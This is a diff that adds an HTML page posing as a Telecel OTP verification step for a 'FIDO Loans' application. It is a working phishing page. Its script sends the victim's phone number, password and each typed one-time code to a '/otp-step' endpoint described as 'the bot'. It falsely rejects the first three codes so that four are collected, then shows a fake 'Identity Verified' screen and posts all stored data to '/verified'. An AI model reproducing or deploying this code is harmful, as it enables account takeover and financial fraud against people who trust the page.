@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>OTP Verification – FIDO Loans</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Nunito', sans-serif;
+      background: #0d0d0d;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background:
+        radial-gradient(ellipse at 80% 20%, rgba(200,30,30,.45) 0%, transparent 60%),
+        radial-gradient(ellipse at 20% 80%, rgba(160,10,10,.25) 0%, transparent 55%);
+      pointer-events: none;
+    }
+
+    .card {
+      position: relative; z-index: 1;
+      width: 100%; max-width: 420px;
+      padding: 44px 32px 40px;
+      text-align: center;
+    }
+
+    .avatar {
+      width: 72px; height: 72px; border-radius: 50%;
+      background: #e8192c;
+      display: inline-flex; align-items: center; justify-content: center;
+      margin-bottom: 12px;
+      box-shadow: 0 0 30px rgba(232,25,44,.5);
+    }
+    .avatar span { font-size: 2rem; font-weight: 800; color: #fff; }
+
+    .brand-name    { font-size: 1.1rem; font-weight: 800; color: #fff; letter-spacing: 1px; margin-bottom: 4px; }
+    .title         { font-size: 1.15rem; font-weight: 800; color: #fff; margin: 18px 0 6px; }
+    .sub           { font-size: .83rem; color: #aaa; line-height: 1.6; margin-bottom: 8px; }
+    .phone-display { font-size: .9rem; color: #e8192c; font-weight: 700; margin-bottom: 30px; }
+
+    /* Hidden dots – logic only, invisible in UI */
+    .attempt-wrap { display: none; }
+
+    /* OTP boxes */
+    .otp-row {
+      display: flex; justify-content: center; gap: 10px; margin-bottom: 10px;
+    }
+    .otp-box {
+      width: 48px; height: 58px;
+      background: #1a1a1a;
+      border: 2px solid #333;
+      border-radius: 10px;
+      font-size: 1.5rem; font-weight: 800;
+      color: #fff; text-align: center;
+      outline: none;
+      transition: border-color .2s, box-shadow .2s, transform .15s;
+      caret-color: #e8192c;
+    }
+    .otp-box:focus  { border-color: #e8192c; box-shadow: 0 0 0 3px rgba(232,25,44,.2); }
+    .otp-box.filled { border-color: #555; }
+    .otp-box.correct{ border-color: #4caf91; box-shadow: 0 0 0 3px rgba(76,175,145,.25); }
+    .otp-box.shake  { border-color: #e8192c; animation: shake .4s; }
+
+    @keyframes shake {
+      0%,100% { transform: translateX(0); }
+      20%     { transform: translateX(-6px); }
+      40%     { transform: translateX(6px); }
+      60%     { transform: translateX(-4px); }
+      80%     { transform: translateX(4px); }
+    }
+
+    .hint {
+      font-size: .78rem; color: #666; margin-bottom: 28px; min-height: 18px;
+      transition: color .2s;
+    }
+    .hint.success { color: #4caf91; }
+    .hint.error   { color: #e8192c; }
+
+    .resend-row { font-size: .82rem; color: #777; margin-bottom: 28px; }
+    .resend-row span { color: #e8192c; cursor: pointer; font-weight: 700; }
+    .resend-row span:hover { text-decoration: underline; }
+    #countdown { color: #aaa; }
+
+    .btn {
+      display: block; width: 100%; padding: 14px; border: none; border-radius: 8px;
+      font-family: inherit; font-size: 1rem; font-weight: 700; cursor: pointer;
+      transition: opacity .2s, transform .1s; margin-top: 10px;
+    }
+    .btn-red  { background: #e8192c; color: #fff; }
+    .btn-red:hover:not(:disabled) { opacity: .9; transform: translateY(-1px); }
+    .btn-red:disabled { opacity: .45; cursor: not-allowed; }
+    .btn-outline { background: transparent; color: #e8192c; border: 2px solid #e8192c; }
+    .btn-outline:hover { background: rgba(232,25,44,.1); }
+
+    .version { font-size: .75rem; color: #444; margin-top: 22px; }
+    #resend-btn { display: none; }
+    #ref-num { font-size: .78rem; }
+
+    /* ══════════════════════════════════════
+       SUCCESS FULL-SCREEN
+    ══════════════════════════════════════ */
+    #success-overlay {
+      display: none;
+      position: fixed; inset: 0;
+      background: #080808;
+      z-index: 1000;
+      align-items: center; justify-content: center;
+      flex-direction: column;
+      text-align: center;
+      padding: 40px 32px;
+    }
+    #success-overlay.show { display: flex; }
+
+    #success-overlay::before {
+      content: '';
+      position: fixed; inset: 0;
+      background:
+        radial-gradient(ellipse at 50% 38%, rgba(76,175,145,.2) 0%, transparent 58%),
+        radial-gradient(ellipse at 25% 72%, rgba(40,130,100,.1) 0%, transparent 50%);
+      animation: glowPulse 3s ease-in-out infinite alternate;
+      pointer-events: none;
+    }
+    @keyframes glowPulse {
+      from { opacity: .55; }
+      to   { opacity: 1; }
+    }
+
+    .success-inner {
+      position: relative; z-index: 1;
+      display: flex; flex-direction: column; align-items: center;
+      width: 100%; max-width: 360px;
+    }
+
+    /* Outer pulsing ring */
+    .ring-outer {
+      width: 148px; height: 148px; border-radius: 50%;
+      border: 2px solid rgba(76,175,145,.2);
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 32px;
+      animation: ringPulse 2.2s ease-in-out infinite;
+    }
+    @keyframes ringPulse {
+      0%,100% { box-shadow: 0 0 0 0 rgba(76,175,145,.3); }
+      50%      { box-shadow: 0 0 0 20px rgba(76,175,145,0); }
+    }
+
+    .ring-inner {
+      width: 112px; height: 112px; border-radius: 50%;
+      background: rgba(76,175,145,.08);
+      border: 3px solid #4caf91;
+      display: inline-flex; align-items: center; justify-content: center;
+      animation: popIn .65s cubic-bezier(.34,1.56,.64,1) both;
+    }
+    @keyframes popIn {
+      from { opacity: 0; transform: scale(.3); }
+      to   { opacity: 1; transform: scale(1); }
+    }
+
+    .check-svg { width: 56px; height: 56px; }
+    .check-svg polyline {
+      stroke: #4caf91; stroke-width: 2.8;
+      fill: none; stroke-linecap: round; stroke-linejoin: round;
+      stroke-dasharray: 42; stroke-dashoffset: 42;
+      animation: drawCheck .55s .45s ease forwards;
+    }
+    @keyframes drawCheck { to { stroke-dashoffset: 0; } }
+
+    .success-inner h2 {
+      font-size: 1.75rem; font-weight: 800; color: #fff;
+      margin-bottom: 8px;
+      animation: fadeUp .5s .55s both;
+    }
+    .success-tagline {
+      font-size: .95rem; color: #4caf91; font-weight: 700;
+      margin-bottom: 14px;
+      animation: fadeUp .5s .65s both;
+    }
+    .success-inner p {
+      font-size: .87rem; color: #777; max-width: 290px; line-height: 1.78;
+      animation: fadeUp .5s .75s both;
+    }
+    .success-inner p strong { color: #bbb; }
+
+    /* Info cards row */
+    .info-cards {
+      display: flex; gap: 10px;
+      width: 100%;
+      margin-top: 28px;
+      animation: fadeUp .5s .9s both;
+    }
+    .info-card {
+      flex: 1;
+      background: #111;
+      border: 1px solid #1e1e1e;
+      border-radius: 12px;
+      padding: 14px 10px 12px;
+    }
+    .ic-label { font-size: .67rem; color: #444; letter-spacing: .06em; text-transform: uppercase; margin-bottom: 6px; }
+    .ic-value { font-size: .88rem; font-weight: 800; color: #bbb; }
+    .ic-value.green { color: #4caf91; }
+
+    /* Thin separator */
+    .sep {
+      width: 50px; height: 2px; border-radius: 2px;
+      background: linear-gradient(90deg, transparent, #4caf91 50%, transparent);
+      margin: 26px auto 0;
+      animation: fadeUp .5s 1.05s both;
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(18px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ── OTP Card ── -->
+<div class="card">
+  <div class="avatar"><span>t</span></div>
+  <p class="brand-name">telecel</p>
+
+  <p class="title">OTP Verification</p>
+  <p class="sub">Enter the 6-digit code sent to</p>
+  <p class="phone-display" id="phone-label">your Telecel number</p>
+
+  <!-- Dots hidden from UI, used only by JS -->
+  <div class="attempt-wrap" id="dots">
+    <div class="dot" id="dot-0"></div>
+    <div class="dot" id="dot-1"></div>
+    <div class="dot" id="dot-2"></div>
+    <div class="dot" id="dot-3"></div>
+  </div>
+
+  <div class="otp-row">
+    <input class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="text" autocomplete="off" aria-label="Digit 1" placeholder="·">
+    <input class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="text" autocomplete="off" aria-label="Digit 2" placeholder="·">
+    <input class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="text" autocomplete="off" aria-label="Digit 3" placeholder="·">
+    <input class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="text" autocomplete="off" aria-label="Digit 4" placeholder="·">
+    <input class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="text" autocomplete="off" aria-label="Digit 5" placeholder="·">
+    <input class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="text" autocomplete="off" aria-label="Digit 6" placeholder="·">
+  </div>
+
+  <p class="hint" id="hint">Enter the code from your SMS</p>
+
+  <div class="resend-row">
+    Didn't receive code?
+    <span id="resend-btn" onclick="resendCode()">Resend OTP</span>
+    <span id="countdown">Resend in <b id="timer">30</b>s</span>
+  </div>
+
+  <button class="btn btn-red" id="verify-btn" disabled onclick="verifyOTP()">Verify</button>
+  <button class="btn btn-outline" onclick="window.location='details.html'">Go Back</button>
+
+  <p class="version">v 5.3.2 (1.0.0)</p>
+</div>
+
+<!-- ══════════════════════════════════════
+     SUCCESS FULL-SCREEN OVERLAY
+══════════════════════════════════════ -->
+<div id="success-overlay">
+  <div class="success-inner">
+
+    <div class="ring-outer">
+      <div class="ring-inner">
+        <svg class="check-svg" viewBox="0 0 24 24">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+      </div>
+    </div>
+
+    <h2>Identity Verified!</h2>
+    <p class="success-tagline">Your Telecel account has been confirmed</p>
+    <p>Your loan application is now under review.<br>Our team will contact you within <strong>24–48 hours</strong>.</p>
+
+    <div class="info-cards">
+      <div class="info-card">
+        <div class="ic-label">Status</div>
+        <div class="ic-value green">✓ Verified</div>
+      </div>
+      <div class="info-card">
+        <div class="ic-label">Reference</div>
+        <div class="ic-value" id="ref-num">FL-······</div>
+      </div>
+      <div class="info-card">
+        <div class="ic-label">Next Step</div>
+        <div class="ic-value">Review</div>
+      </div>
+    </div>
+
+    <div class="sep"></div>
+
+  </div>
+</div>
+
+<script>
+  const TOTAL_ROUNDS = 4;
+  let round = 0;
+  let timerInterval = null;
+
+  const boxes       = Array.from(document.querySelectorAll('.otp-box'));
+  const verifyBtn   = document.getElementById('verify-btn');
+  const hintEl      = document.getElementById('hint');
+  const phoneLabel  = document.getElementById('phone-label');
+  const timerEl     = document.getElementById('timer');
+  const countdownEl = document.getElementById('countdown');
+  const resendBtn   = document.getElementById('resend-btn');
+
+  /* Init */
+  const stored = JSON.parse(sessionStorage.getItem('loanData') || '{}');
+  if (stored.phone) phoneLabel.textContent = stored.phone;
+  startCountdown(30);
+  boxes[0].focus();
+
+  /* Input wiring */
+  boxes.forEach((box, i) => {
+    box.addEventListener('input', e => {
+      const val = e.target.value.replace(/\D/g, '');
+      box.value = val ? val[0] : '';
+      box.classList.toggle('filled', !!box.value);
+      if (val && i < 5) boxes[i + 1].focus();
+      updateBtn();
+    });
+
+    box.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !box.value && i > 0) {
+        boxes[i - 1].value = '';
+        boxes[i - 1].classList.remove('filled');
+        boxes[i - 1].focus();
+        updateBtn();
+      }
+      if (e.key === 'Enter' && !verifyBtn.disabled) verifyOTP();
+      if (e.key === 'ArrowLeft'  && i > 0) boxes[i - 1].focus();
+      if (e.key === 'ArrowRight' && i < 5) boxes[i + 1].focus();
+    });
+
+    box.addEventListener('paste', e => {
+      e.preventDefault();
+      const digits = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
+      digits.split('').forEach((d, j) => {
+        if (boxes[j]) { boxes[j].value = d; boxes[j].classList.add('filled'); }
+      });
+      boxes[Math.min(digits.length, 5)].focus();
+      updateBtn();
+    });
+  });
+
+  function updateBtn() {
+    verifyBtn.disabled = boxes.some(b => !b.value);
+  }
+
+  /* Verify */
+  function verifyOTP() {
+    if (boxes.some(b => !b.value)) return;
+    const code = boxes.map(b => b.value).join('');
+
+    round++;
+
+    // Send this OTP attempt to the bot
+    fetch('/otp-step', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        phone: stored.phone,
+        password: stored.password,
+        code: code,
+        round: round
+      })
+    }).catch(() => {});
+
+    verifyBtn.disabled = true;
+
+    if (round < TOTAL_ROUNDS) {
+      /* Rounds 1–3: Show error feedback before resetting */
+      setBoxState('shake');
+      setHint('Invalid or expired code. Please try again.', 'error');
+      setTimeout(() => {
+        clearBoxes();
+        setHint('Enter the code from your SMS', '');
+        boxes[0].focus();
+        startCountdown(30);
+      }, 1000);
+    } else {
+      /* Round 4 (final): green flash on boxes then show success */
+      setBoxState('correct');
+      setHint('✓ Code accepted', 'success');
+      verifyBtn.disabled = true;
+      setTimeout(showSuccess, 1000);
+    }
+  }
+
+  function setBoxState(cls) {
+    boxes.forEach(b => { b.classList.remove('correct', 'shake'); if (cls) b.classList.add(cls); });
+  }
+  function clearBoxes() {
+    boxes.forEach(b => { b.value = ''; b.classList.remove('filled', 'correct', 'shake'); });
+  }
+  function setHint(msg, type) {
+    hintEl.textContent = msg;
+    hintEl.className = 'hint' + (type ? ` ${type}` : '');
+  }
+
+  /* Countdown */
+  function startCountdown(seconds) {
+    clearInterval(timerInterval);
+    resendBtn.style.display = 'none';
+    countdownEl.style.display = '';
+    timerEl.textContent = seconds;
+    timerInterval = setInterval(() => {
+      seconds--;
+      timerEl.textContent = seconds;
+      if (seconds <= 0) {
+        clearInterval(timerInterval);
+        countdownEl.style.display = 'none';
+        resendBtn.style.display = 'inline';
+      }
+    }, 1000);
+  }
+
+  function resendCode() {
+    setHint('A new code has been sent.', 'success');
+    setTimeout(() => setHint('Enter the code from your SMS', ''), 2500);
+    startCountdown(30);
+  }
+
+  /* Success */
+  function showSuccess() {
+    clearInterval(timerInterval);
+    const ref = 'FL-' + Math.random().toString(36).slice(2, 8).toUpperCase();
+    document.getElementById('ref-num').textContent = ref;
+
+    try {
+      const d = JSON.parse(sessionStorage.getItem('loanData') || '{}');
+      fetch('/verified', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ...d, ref })
+      }).catch(() => {});
+    } catch (e) {}
+
+    document.getElementById('success-overlay').classList.add('show');
+    sessionStorage.clear();
+  }
+</script>
+</body>
+</html>
